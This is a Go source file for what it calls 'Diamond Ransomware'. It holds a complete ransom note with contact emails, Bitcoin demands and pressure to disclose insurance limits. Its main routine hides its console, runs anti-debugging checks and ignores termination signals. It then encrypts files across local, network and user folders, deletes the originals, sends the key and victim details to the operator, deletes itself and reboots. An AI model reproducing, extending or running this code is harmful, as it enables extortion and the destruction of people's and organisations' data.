package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

var IsAdmin = isRunAsAdmin()
var WindowsEdition = getWindowsEdition()

//go:embed wallpaper.jpg
var ImageContent []byte

//go:embed Note.hta
var NoteContent []byte
var NoteContentString string

var Verbose = false
var Isonline = false
var Email1 = "Arsoftwar666@tutanota.com"
var Email2 = "Arsoftwar666@mailfence.com"

var Note = `                                 [Diamond Ransomware]

Attention!! (Do not scan the files with antivirus in any case. In case of data loss, the consequences are yours) Attention!!

----
what happened?
All your files have been stolen and then encrypted. But don't worry, everything is safe and will be returned to you.
----
How can I get my files back?
You have to pay us to get the files back. We don't have bank or paypal accounts, you only have to pay us via Bitcoin.
----
How can I buy bitcoins?
You can buy bitcoins from all reputable sites in the world and send them to us. Just search how to buy bitcoins on the internet. Our suggestion is these sites.
>>www.binance.com/en<<or>>www.coinbase.com<<or>>localbitcoins.com<<or>>www.bybit.com<<
----
What is your guarantee to restore files?
Its just a business. We absolutely do not care about you and your deals, except getting benefits. If we do not do our work and liabilities - nobody will cooperate with us. Its not in our interests.
To check the ability of returning files, you can send to us any 2 files with SIMPLE extensions(jpg,xls,doc, etc... not databases!) and low sizes(max 1 mb), we will decrypt them and send back to you.
That is our guarantee.
----
How to contact with you?
If you want to restore them, Write us a E-mail:  {Email1}
Include this ID on your Message: {Username}
In case of no answer in 24 hours write us to this e-mail: {Email2}

----
How will the payment process be after payment?
After payment, we will send you the decryption tool along with the guide and we will be with you until the last file is decrypted.
----
What happens if I don't pay you?
If you don't pay us, you will never have access to your files because the private key is only in our hands. This transaction is not important to us,
but it is important to you, because not only do you not have access to your files, but you also lose time. And the more time passes, the more you will lose and
If you do not pay the ransom, we will attack your company again in the future.
----
What are your recommendations?
- Never change the name of the files, if you want to manipulate the files, make sure you make a backup of them. If there is a problem with the files, we are not responsible for it.
- Never work with intermediary companies, because they charge more money from you. For example, if we ask you for 50,000 dollars, they will tell you 55,000 dollars. Don't be afraid of us, just call us.
----
Very important! For those who have cyber insurance against ransomware attacks.
Insurance companies require you to keep your insurance information secret, this is to never pay the maximum amount specified in the contract or to pay nothing at all, disrupting negotiations.
The insurance company will try to derail negotiations in any way they can so that they can later argue that you will be denied coverage because your insurance does not cover the ransom amount.
For example your company is insured for 10 million dollars, while negotiating with your insurance agent about the ransom he will offer us the lowest possible amount, for example 100 thousand dollars,
we will refuse the paltry amount and ask for example the amount of 15 million dollars, the insurance agent will never offer us the top threshold of your insurance of 10 million dollars.
He will do anything to derail negotiations and refuse to pay us out completely and leave you alone with your problem. If you told us anonymously that your company was insured for $10 million and other
important details regarding insurance coverage, we would not demand more than $10 million in correspondence with the insurance agent. That way you would have avoided a leak and decrypted your information.
But since the sneaky insurance agent purposely negotiates so as not to pay for the insurance claim, only the insurance company wins in this situation. To avoid all this and get the money on the insurance,
be sure to inform us anonymously about the availability and terms of insurance coverage, it benefits both you and us, but it does not benefit the insurance company. Poor multimillionaire insurers will not
starve and will not become poorer from the payment of the maximum amount specified in the contract, because everyone knows that the contract is more expensive than money, so let them fulfill the conditions
prescribed in your insurance contract, thanks to our interaction.
-----
`

func init() {
	Note = strings.ReplaceAll(Note, "{Email1}", Email1)
	Note = strings.ReplaceAll(Note, "{Email2}", Email2)
	NoteContentString = string(NoteContent)
	NoteContentString = strings.ReplaceAll(NoteContentString, "{Email1}", Email1)
	NoteContentString = strings.ReplaceAll(NoteContentString, "{Email2}", Email2)
}

func setupSignalHandler() {
	// Create a channel to listen for signals
	sigChan := make(chan os.Signal, 1)
	ShutdownSignals := []os.Signal{
		os.Interrupt, os.Kill, syscall.SIGKILL,
		syscall.SIGHUP, syscall.SIGINT, syscall.SIGQUIT, syscall.SIGILL, syscall.SIGTRAP,
		syscall.SIGABRT, syscall.SIGTERM,
	}
	signal.Notify(sigChan, ShutdownSignals...)

	go func() {
		for {
			// Block until a signal is received
			<-sigChan
		}
	}()
}

func main() {
	if !Verbose {
		HConsole()
	}

	var wg2 sync.WaitGroup
	antiDebug := NewAntiDebug()
	wg2.Add(1)
	go func() {
		defer wg2.Done()
		antiDebug.checks()
	}()
	go func() {
		for {
			antiDebug.checkProcess()
			time.Sleep(3 * time.Second)
		}
	}()

	setupSignalHandler()

	if Verbose {
		fmt.Println("IsAdmin: " + strconv.FormatBool(IsAdmin))
		fmt.Println("WindowsEdition: " + strconv.FormatInt(int64(WindowsEdition), 10))
		fmt.Println("Background Length: " + strconv.Itoa(len(ImageContent)))
	}

	if !IsOnline() {
		os.Exit(0)
	}

	//if Verbose {
	//	fmt.Println("Skipping LetsPlaySomeGames")
	//} else {
	//	LetsPlaySomeGames()
	//}

	if currentUser == "Sno" {
		os.Exit(0)
	}

	var tasks []func() error
	Salt := generateRandomString(16)
	rUser := generateRandomString(12)
	encryptionKey := generateEncryptionKey2() + generateEncryptionKey2()
	if Verbose {
		fmt.Println("Salt: " + Salt)
		fmt.Println("EncryptionKey: " + encryptionKey)
	}
	NoteContentString = strings.ReplaceAll(NoteContentString, "{Username}", rUser)
	Note = strings.ReplaceAll(Note, "{Username}", rUser)
	numCPU := runtime.NumCPU()
	encryptor := NewSpaceEncryptor(encryptionKey, Salt)

	runtime.GOMAXPROCS(numCPU)

	var wgForFiles sync.WaitGroup

	// get paths in drivers
	wgForFiles.Add(1)
	go func(wg *sync.WaitGroup) {
		defer wg.Done()
		list := getDriversList()
		if len(list) > 0 {
			drivers, err := getFilesInFolders(list, folderblacklist)
			if err != nil {
				if Verbose {
					fmt.Println(err)
				}
				os.Exit(0)
			}

			for _, file := range drivers {
				tasks = append(tasks, encryptFile(encryptor, file))
			}
			drivers = nil
		}
	}(&wgForFiles)

	// get paths in network drives
	wgForFiles.Add(1)
	go func(wg *sync.WaitGroup) {
		defer wg.Done()
		networkDrives := GetNetworkDrives()
		if len(networkDrives) > 0 {
			nwdrives, err := getFilesInFolders(networkDrives, folderblacklist)
			if err != nil {
				if Verbose {
					fmt.Println(err)
				}
			}

			for _, file := range nwdrives {
				tasks = append(tasks, encryptFile(encryptor, file))
			}
			nwdrives = nil
		}
	}(&wgForFiles)

	// get paths in specified folders
	wgForFiles.Add(1)
	go func(wg *sync.WaitGroup) {
		defer wg.Done()
		files, err := getFilesInFolders(paths(currentUser), folderblacklist)
		if err != nil {
			if Verbose {
				fmt.Println(err)
			}
		}

		for _, file := range files {
			tasks = append(tasks, encryptFile(encryptor, file))
		}
		files = nil
	}(&wgForFiles)

	wgForFiles.Wait()

	if len(tasks) == 0 {
		if Verbose {
			fmt.Println("no files to encrypt")
		}
		os.Exit(0)
	}

	tasklist := splitTasks(tasks, numCPU*8)
	tasks = nil

	runtime.GC()
	var wg sync.WaitGroup
	start := time.Now()
	for _, task := range tasklist {
		wg.Add(1)
		go func(task []func() error) {
			defer wg.Done()
			for _, f := range task {
				_ = f()
				//if done%1000 == 0 {
				//}
			}
			runtime.GC()
		}(task)
	}
	wg.Wait()
	end := fmt.Sprintf("%s", time.Since(start).String())

	if Verbose {
		fmt.Println("done, Sending Information Request")
	}

	_, _ = SendInformationRequest(&InformationRequest{
		Key:                 encryptionKey,
		Salt:                Salt,
		Username:            rUser,
		SUsername:           currentUser,
		AntiVirus:           "Sesemi Open Please",
		EncryptedFileAmount: done,
		WindowsEdition:      strconv.FormatInt(int64(WindowsEdition), 10),
		TimeTaken:           end,
	})

	SetupThings()

	if true {
		err := os.Remove(os.Args[0])
		if err != nil {
			_ = os.Rename(os.Args[0], "Fcat.png.diamond")
		}
	}
	if !Verbose {
		Reboot()
	}
}

func encryptFile(encryptor *SpaceEncryptor, file string) func() error {
	return func() error {
		defer func(name string) {
			err := os.Remove(name)
			if err != nil {
			}
		}(file)

		encryptor.EncryptMessageV2(file)
		last = file
		done++
		return nil
	}
}
